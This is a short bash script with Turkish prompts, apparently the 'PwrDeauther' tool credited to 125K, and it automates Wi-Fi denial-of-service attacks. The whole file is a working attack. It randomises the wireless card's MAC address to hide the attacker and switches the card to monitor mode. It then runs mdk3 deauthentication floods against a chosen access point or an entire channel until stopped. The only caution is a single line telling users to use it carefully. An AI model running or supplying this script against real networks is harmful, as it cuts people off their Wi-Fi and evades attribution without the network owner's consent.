#!/bin/bash

# TERMINAL COLORS
# https://github.com/125K/terminal-colors
NO_COLOR="\e[0m"
WHITE="\e[0;17m"
BOLD_WHITE="\e[1;37m"
BLACK="\e[0;30m"
BLUE="\e[0;34m"
BOLD_BLUE="\e[1;34m"
GREEN="\e[0;32m"
BOLD_GREEN="\e[1;32m"
CYAN="\e[0;36m"
BOLD_CYAN="\e[1;36m"
RED="\e[0;31m"
BOLD_RED="\e[1;31m"
PURPLE="\e[0;35m"
BOLD_PURPLE="\e[1;35m"
BROWN="\e[0;33m"
BOLD_YELLOW="\e[1;33m"
GRAY="\e[0;37m"
BOLD_GRAY="\e[1;30m"
# END OF TERMINAL COLORS

function coolexit()
{
	clear
	sleep 2
	ifconfig $WI down
	macchanger -p $WI
	iwconfig $WI mode managed
	ifconfig $WI up
	clear
	title
	echo -e $BOLD_RED
	echo " Bu scripti dikkatli kullanın"
	echo -e " GitHub:$BOLD_WHITE https://github.com/125K"
	exit
}

function title() {
	echo -e $BOLD_GREEN
	echo "     ____                ____	                __  __	     "
	echo "    / __ \\_      _______/ __ \\___  ____ ___  __/ /_/ /_  ___  _____"
	echo "   / /_/ / | /| / / ___/ / / / _ \\/ __ \`/ / / / __/ __ \\/ _ \\/ ___/"
	echo "  / ____/| |/ |/ / /  / /_/ /  __/ /_/ / /_/ / /_/ / / /  __/ /    "
	echo " /_/     |__/|__/_/  /_____/\\___/\\__,_/\\__,_/\\__/_/ /_/\\___/_/     "
	echo -e $BOLD_WHITE
	echo "				Automatic MDK3 deauther by 125K"
}

function getIFCARD() {
        echo -e "$BOLD_GREEN   Arabirimleriniz: "
        echo -e -n "$BOLD_WHITE"
        ifconfig | grep -e ": " | sed -e 's/: .*//g' | sed -e 's/^/   /'
        echo " "
        echo -n -e "$BOLD_CYAN   Kablosuz arabiriminizi girin > "
        echo -n -e "$BOLD_WHITE"
}

function changeMAC() {
        ifconfig $WI down
        iwconfig $WI mode monitor
        macchanger -r $WI
        ifconfig $WI up
}

title
echo -e $BOLD_CYAN
echo " Saldırı tipini seçin:"
echo " "
echo -e "$BOLD_BLUE 1.$BOLD_WHITE Belirli bir BSSID yayını sabote edin"
echo -e "$BOLD_BLUE 2.$BOLD_WHITE Komple bir kanalı sabote edin"
echo " "
echo -n -e "$BOLD_WHITE > "
read CHOICE
clear

if [ $CHOICE == 1 ]; then
	title
	echo -e $NO_COLOR
	nmcli dev wifi
	echo " "
	echo -e -n $BOLD_CYAN
	echo -n " Hedef BSSID adını seçin > "
	echo -e -n $BOLD_WHITE
	read BSSID
	clear
	title
	echo " "
	getIFCARD
	read WI
	echo " "
	echo -e $BOLD_GREEN
	echo "Saldırı başlatılıyor... Durdurmak için CTRL+C 'ye basın."
	changeMAC
	trap coolexit EXIT
	mdk3 $WI d -t "$BSSID"
elif [ $CHOICE == 2 ]; then
	title
	echo -e $NO_COLOR
	nmcli dev wifi
	echo " "
	echo -e -n $BOLD_CYAN
	echo -n " Hedef kanalı girin > "
	echo -e -n $BOLD_WHITE
	read CH
	clear
	title
	echo " "
	getIFCARD
	read WI
	echo " "
 	echo -e $BOLD_GREEN
	echo -e "Saldırı başlatılıyor... Durdurmak için CTRL+C 'ye basın."
	changeMAC
	trap coolexit EXIT
	mdk3 $WI d -c $CH
else
	echo -e $BOLD_RED Invalid option
	sleep 3
	coolexit
fi
